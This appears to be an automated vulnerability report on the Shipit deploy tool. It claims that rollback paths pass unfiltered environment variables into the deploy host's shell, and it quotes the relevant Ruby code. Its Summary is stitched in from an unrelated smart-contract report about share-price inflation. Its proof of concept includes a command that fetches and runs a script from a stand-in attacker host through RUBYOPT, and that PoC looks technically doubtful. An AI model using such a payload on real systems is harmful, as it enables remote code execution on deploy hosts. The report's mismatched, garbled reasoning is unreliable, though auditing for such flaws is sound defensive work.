### Title
Unfiltered environment variables in `Deploy#build_rollback` allow arbitrary env injection into the deploy host's shell — RCE on rollback ([File: app/models/shipit/deploy.rb])

### Summary
The inflation-attack report is about a code path that accepts an unchecked/unvalidated input (`_sharesAmount`) that later corrupts a value (share price) the rest of the contract implicitly trusts to be sane. The closest analog in this engine is a **permitted-env-key vs. spawned-env-key** binding break: the whitelist that `shipit.yml` declares for `rollback.variables` is enforced on the normal deploy path but is skipped on the rollback path, letting a caller-supplied `env` hash flow unfiltered into the shell environment used to run rollback commands on the deploy host.

### Finding Description
`Stack#build_deploy` filters user-supplied `env` through the whitelist declared in `shipit.yml` before persisting it on the `Task`: [1](#0-0) 

`TaskDefinition#filter_envs` / `Stack#filter_deploy_envs` enforce that only variable names declared in the deploy spec (`deploy.variables` / `rollback.variables`) are allowed — anything else raises `EnvironmentVariables::NotPermitted`: [2](#0-1) [3](#0-2) 

However, `Deploy#build_rollback` and `Deploy#trigger_revert` construct the `Rollback` record with the raw, **unfiltered** `env.to_h` — bypassing the same whitelist that `filter_deploy_envs` enforces for regular deploys: [4](#0-3) [5](#0-4) 

The equality the code implicitly promises is:
`env keys permitted by shipit.yml's rollback.variables whitelist == env keys actually merged into the rollback task's shell environment`

For deploys this holds (`filter_deploy_envs` is applied), but for rollbacks it does not — `build_rollback`/`trigger_revert` never call `filter_deploy_envs` or any `EnvironmentVariables.permit` equivalent.

Whatever ends up in `task.env` is merged directly into the process environment used to spawn shell commands: [6](#0-5) [7](#0-6) 

Because `@task.env` is merged last (overriding `machine_env` and other computed values) and is used both as literal shell environment and for `$VAR` interpolation in step commands (`EnvironmentVariables#interpolate`, `Command#interpolated_arguments`), an attacker who can trigger a rollback with an arbitrary env hash can inject dangerous environment variables — e.g. `RUBYOPT`, `BUNDLE_GEMFILE`, `GIT_SSH_COMMAND`, `LD_PRELOAD`, or `PATH` — into the shell that runs the rollback (and deploy) steps on the deploy host: [8](#0-7) 

### Impact Explanation
This crosses the "Critical – RCE on the deploy host" bar: because the whitelist normally guaranteeing only declared `rollback.variables` names reach the shell is bypassed, an unprivileged-but-permitted caller of the rollback action can smuggle interpreter/loader-hijacking environment variables (`RUBYOPT`, `GIT_SSH_COMMAND`, `LD_PRELOAD`, etc.) into the command execution environment for `Command#start` (`PTY.spawn(unbundled_env, ...)`), achieving arbitrary code execution on the host running deploy/rollback steps.

### Likelihood Explanation
Any caller with permission to trigger a rollback (a normal, already-authorized deploy-permission user, not necessarily an admin) can exercise this path — the rollback UI/API accepts an `env` parameter analogous to `tasks_controller`'s `env` parameter, but unlike the task/deploy trigger paths, the rollback construction path never runs it through `EnvironmentVariables.permit`. This makes it directly reachable without any additional privilege beyond what's already needed to request a rollback.

### Recommendation
- In `Deploy#build_rollback` and `Deploy#trigger_revert`, filter the incoming `env` through `stack.filter_deploy_envs(env.to_h)` (the same whitelist mechanism used by `build_deploy`), instead of passing `env.to_h` directly.
- Audit all `Task`/`Rollback` construction sites for consistent use of `EnvironmentVariables.permit`, so that "permitted env keys" and "spawned env keys" are provably equal.

### Proof of Concept
1. A user with deploy/rollback permission on a stack calls the rollback trigger endpoint with `env: { "RUBYOPT" => "-e$(system 'curl attacker.com/x|sh')" }` (or an equivalent unlisted variable name not present in `rollback.variables`).
2. `Deploy#build_rollback` builds the `Rollback` with `env: env.to_h` — no whitelist check is applied, unlike `Stack#build_deploy`, so the arbitrary key passes straight through.
3. During task execution, `TaskCommands#env` merges `@task.env` last, and `Command#unbundled_env`/`PTY.spawn` use this merged hash as the literal process environment for every rollback step, executing attacker-controlled code on the deploy host.

### Citations

**File:** app/models/shipit/stack.rb (L161-172)
```ruby
    def build_deploy(until_commit, user, env: nil, force: false, allow_concurrency: force)
      since_commit = last_deployed_commit.presence || commits.first
      deploys.build(
        user_id: user.id,
        until_commit:,
        since_commit:,
        env: filter_deploy_envs(env.to_h),
        allow_concurrency:,
        ignored_safeties: force || !until_commit.deployable?,
        max_retries: retries_on_deploy
      )
    end
```

**File:** app/models/shipit/task_definition.rb (L63-65)
```ruby
    def filter_envs(env)
      EnvironmentVariables.with(env).permit(variables)
    end
```

**File:** lib/shipit/environment_variables.rb (L13-18)
```ruby
    def permit(variable_definitions)
      return {} unless @env
      raise "A whitelist is required to sanitize environment variables" unless variable_definitions

      sanitize_env_vars(variable_definitions)
    end
```

**File:** lib/shipit/environment_variables.rb (L20-27)
```ruby
    def interpolate(argument)
      return argument unless @env

      argument.gsub(/(\$\w+)/) do |variable|
        variable.sub!('$', '')
        Shellwords.escape(@env.fetch(variable) { ENV[variable] })
      end
    end
```

**File:** app/models/shipit/deploy.rb (L90-117)
```ruby
    def build_rollback(user = nil, env: nil, force: false)
      Rollback.new(
        user_id: user&.id,
        stack_id:,
        parent_id: id,
        since_commit: stack.last_deployed_commit,
        until_commit:,
        env: env.to_h,
        allow_concurrency: force,
        ignored_safeties: force,
        max_retries: stack.retries_on_rollback
      )
    end

    # Rolls the stack back to this deploy
    def trigger_rollback(user = AnonymousUser.new, env: nil, force: false, lock: true)
      rollback = build_rollback(user, env:, force:)
      rollback.save!
      rollback.enqueue

      if lock
        lock_reason = "A rollback for #{rollback.since_commit.sha} has been triggered. " \
          "Please make sure the reason for the rollback has been addressed before deploying again."
        stack.update!(lock_reason:, lock_author_id: user.id)
      end

      rollback
    end
```

**File:** app/models/shipit/deploy.rb (L119-139)
```ruby
    # Rolls the stack back to the most recent **previous** successful deploy
    def trigger_revert(force: false, rollback_to: nil, env: nil)
      previous_successful_commit = rollback_to&.until_commit || commit_to_rollback_to

      rollback = Rollback.create!(
        user_id:,
        stack_id:,
        parent_id: id,
        since_commit: until_commit,
        until_commit: previous_successful_commit,
        env: env || self.env,
        allow_concurrency: force
      )

      rollback.enqueue
      lock_reason = "A rollback for #{until_commit.sha} has been triggered. " \
        "Please make sure the reason for the rollback has been addressed before deploying again."
      stack.update!(lock_reason:, lock_author_id: user_id)
      stack.emit_lock_hooks
      rollback
    end
```

**File:** lib/shipit/task_commands.rb (L33-48)
```ruby
    def env
      super
        .merge(@stack.env)
        .merge(
          'SHIPIT_USER' => "#{@task.author.login} (#{normalized_author_name}) via Shipit",
          'EMAIL' => @task.author.email,
          'BUNDLE_PATH' => Rails.root.join('data', 'bundler').to_s,
          'SHIPIT_LINK' => @task.permalink,
          'TASK_ID' => @task.id.to_s,
          'IGNORED_SAFETIES' => @task.ignored_safeties? ? '1' : '0',
          'GIT_COMMITTER_NAME' => @task.user&.name || Shipit.committer_name,
          'GIT_COMMITTER_EMAIL' => @task.user&.email || Shipit.committer_email
        )
        .merge(deploy_spec.machine_env)
        .merge(@task.env)
    end
```

**File:** lib/shipit/command.rb (L103-105)
```ruby
    def unbundled_env
      BASE_ENV.merge('PATH' => "#{Shipit.shell_paths.join(':')}:#{ENV['PATH']}").merge(@env.stringify_keys)
    end
```
